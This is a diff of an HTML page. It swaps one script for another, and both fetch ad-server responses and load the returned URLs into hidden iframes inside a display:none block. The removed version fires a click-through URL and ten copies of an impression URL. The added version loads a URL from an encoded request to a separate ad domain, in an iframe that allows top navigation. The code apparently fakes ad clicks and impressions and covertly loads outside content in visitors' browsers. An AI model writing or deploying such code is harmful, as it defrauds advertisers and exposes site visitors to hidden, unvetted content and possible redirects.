@@ -3,25 +3,10 @@
 <head>
 	<script src = "https://www.tutorialspoint.com/jquery/jquery-3.6.0.js"></script>
 <script>
- $.get("https://srv.aso1.net/vast?z=109092", function(data, status){
-    	//console.log(data);
-        //console.log(data.getElementsByTagName("ClickThrough")[0].childNodes[0].nodeValue);
-        //console.log(data.getElementsByTagName("Impression")[0].childNodes[0].nodeValue);
-	 var click = data.getElementsByTagName("ClickThrough")[0].childNodes[0].nodeValue;
-	 $('#declinedframe').attr('src', click);
-
-	 var imp = data.getElementsByTagName("Impression")[0].childNodes[0].nodeValue;
-	  $('#declinedframe1').attr('src', imp);
- $('#declinedframe2').attr('src', imp);
- $('#declinedframe3').attr('src', imp);
- $('#declinedframe4').attr('src', imp);
- $('#declinedframe5').attr('src', imp);
- $('#declinedframe6').attr('src', imp);
- $('#declinedframe7').attr('src', imp);
- $('#declinedframe8').attr('src', imp);
- $('#declinedframe9').attr('src', imp);
- $('#declinedframe10').attr('src', imp);
-
+$.getJSON("https://wivyiz.com/cuload?a=1&e=aeyJwaWQiOjExNDI2MjAsInNpZCI6MTE3NzQwNSwid2lkIjo1MjA2NTAsImQiOiIiLCJsaSI6MX0=&tz=", function(data, status){
+      console.log((data[0].ads)[0].uf);
+      var uf1 = (data[0].ads)[0].uf;
+	$('#declinedframe').attr('src', uf1);
     });
 </script>
 </head>
@@ -39,17 +24,6 @@
 
 	<div style="display:none">
 <iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe" src="" height="100" width="100" ></iframe>
-
-		<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe1" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe2" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe3" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe4" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe5" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe6" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe7" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe8" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe9" src="" height="100" width="100" ></iframe>
-<iframe sandbox="allow-same-origin allow-scripts allow-forms allow-top-navigation" id="declinedframe10" src="" height="100" width="100" ></iframe>
 
 </div>
 </body>
